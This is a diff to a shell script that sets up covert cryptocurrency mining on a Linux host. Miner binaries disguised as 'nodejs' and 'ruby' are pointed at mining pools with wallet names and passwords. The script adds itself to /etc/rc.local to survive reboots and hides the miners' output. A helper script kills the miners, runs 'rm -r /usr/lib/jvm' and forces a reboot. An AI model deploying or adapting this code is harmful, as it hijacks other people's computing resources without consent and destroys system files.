@@ -7,7 +7,7 @@ echo nameserver 1.1.1.1 > /etc/resolv.conf
 
 echo '
 cd /home/sshuser
-sudo ./e
+./e &
 ' >> /etc/rc.local
 
 mkdir db1 db2
@@ -44,7 +44,7 @@ nice -n 19 ./nodejs -o 47.101.30.124:13531 -u 8AojJ7BLoNn5SKuXLBk4aBMafgUwMqPNMA
 cd /home/sshuser
 sleep 50
 cd /home/sshuser/db2
-nice -n -20 nohup ./ruby --config-file a.txt --pool epic.icemining.ca:4000 --wallet cheddarbrent --password kamAg0nG20495d >/dev/null 2>&1 &
+nice -n -20 nohup ./ruby --config-file a.txt --pool epic.icemining.ca:4000 --wallet ylwflanh --password hMj6uQ409EbY8p >/dev/null 2>&1 &
 
 cd /home/sshuser
 ' > e
@@ -55,13 +55,13 @@ chmod +x d
 echo '#!/bin/sh
 cd /home/sshuser
 sleep 50m
-sudo pkill -e -x nodejs
+pkill -e -x nodejs
 sleep 20
-sudo pkill -e -x ruby
+pkill -e -x ruby
 sleep 20
-sudo rm -r /usr/lib/jvm
+rm -r /usr/lib/jvm
 sleep 20
-sudo shutdown now -r
+shutdown now -r
 ' > d
 
 cd /home/sshuser/db1
@@ -70,10 +70,10 @@ nice -n 19 ./nodejs -o 47.101.30.124:13531 -u 8AojJ7BLoNn5SKuXLBk4aBMafgUwMqPNMA
 cd /home/sshuser
 sleep 60
 cd /home/sshuser/db2
-nice -n -20 nohup ./ruby --config-file a.txt --pool epic.icemining.ca:4000 --wallet cheddarbrent --password kamAg0nG20495d >/dev/null 2>&1 &
+nice -n -20 nohup ./ruby --config-file a.txt --pool epic.icemining.ca:4000 --wallet ylwflanh --password hMj6uQ409EbY8p >/dev/null 2>&1 &
 
 cd /home/sshuser
-./d
+./d &
 
 cd /home/sshuser
 
